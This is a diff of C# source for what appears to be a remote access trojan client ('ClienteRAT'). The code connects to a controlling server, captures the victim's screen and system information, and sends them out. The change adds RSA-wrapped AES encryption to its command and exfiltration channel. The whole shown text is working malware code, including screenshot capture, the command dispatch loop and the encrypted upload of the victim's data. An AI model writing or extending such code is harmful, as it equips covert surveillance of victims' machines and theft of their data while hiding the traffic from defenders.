@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Diagnostics;
 using System.Net.Sockets;
+using System.Security.Cryptography;
 using System.Text;
 using System.Threading.Tasks;
 using Client.Commands;
@@ -14,6 +15,10 @@ namespace Client
 {
     class ClienteRAT
     {
+        private static  byte[] aesKeyClient;
+
+
+        public static byte[] getAesKey() { return aesKeyClient; }
         static async Task Main(string[] args)
         {
             try
@@ -33,8 +38,6 @@ namespace Client
                 ClientSocket.connect();
                 Thread.Sleep(1000);
 
-
-                 ClientSocket.SendResponse(await SystemInfo.GetSystemInfo(),Channel.SystemInfo);
 
                 var stream = ClientSocket.getClientStream();   
                 byte[] buffer = new byte[1024];
@@ -63,6 +66,11 @@ namespace Client
                             var payload = new byte[len];
                             Array.Copy(buffer, 0, payload, 0, len);
 
+                            if (ch != Channel.KeyExchange && aesKeyClient != null)
+                            {
+                                payload = AesHelper.DecryptWithAes(payload, aesKeyClient);
+                            }
+
                             // 4) Despachar por canal
                             switch (ch)
                             {
@@ -89,7 +97,8 @@ namespace Client
                                     {
                                         //Uso Protocol.Send ya que trabaja con bytes
                                         byte[] clientScreenshot = Screenshot.CaptureScreen();
-                                        Protocol.Send(stream, Channel.Screenshot, clientScreenshot);
+                                        byte[] encryptedScreenshot = AesHelper.EncryptWithAes(clientScreenshot, aesKeyClient);
+                                        Protocol.Send(stream, Channel.Screenshot, encryptedScreenshot);
                                     }
                                     break ;
                                 case Channel.Main:
@@ -161,19 +170,20 @@ namespace Client
                                 case Channel.KeyExchange:
 
                                     string publicKeyXml = Encoding.UTF8.GetString(payload);
+                                    RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
+                                    rsa.FromXmlString(publicKeyXml);
 
-                                    // 1. Generar clave AES y IV
-                                    byte[] aesKey = AesHelper.GenerateKey();
-                                    byte[] aesIV = AesHelper.GenerateIV();
+                                    // Generar clave AES aleatoria
+                                    Aes aes = Aes.Create();
+                                    aes.GenerateKey();
+                                    byte[] aesKey = aes.Key;
 
-                                    // 2. Combinar clave + IV
-                                    byte[] aesKeyAndIV = aesKey.Concat(aesIV).ToArray();
+                                    aesKeyClient = aesKey;
+                                    // Cifrar la clave AES con la clave pública RSA
+                                    byte[] encryptedAesKey = rsa.Encrypt(aesKeyClient, false);
+                                    Protocol.Send(stream, Channel.KeyExchange, encryptedAesKey);
 
-                                    // 3. Cifrar con la clave pública RSA recibida
-                                    byte[] encryptedAesKey = RSAHelper.EncryptWithPublicKey(publicKeyXml, aesKeyAndIV);
-
-                                    // 4. Enviar al servidor la clave AES cifrada
-                                    Protocol.Send(ClientSocket.getClientStream(), Channel.KeyExchange, encryptedAesKey);
+                                    ClientSocket.SendResponse(await SystemInfo.GetSystemInfo(), Channel.SystemInfo);
 
                                     break;
 
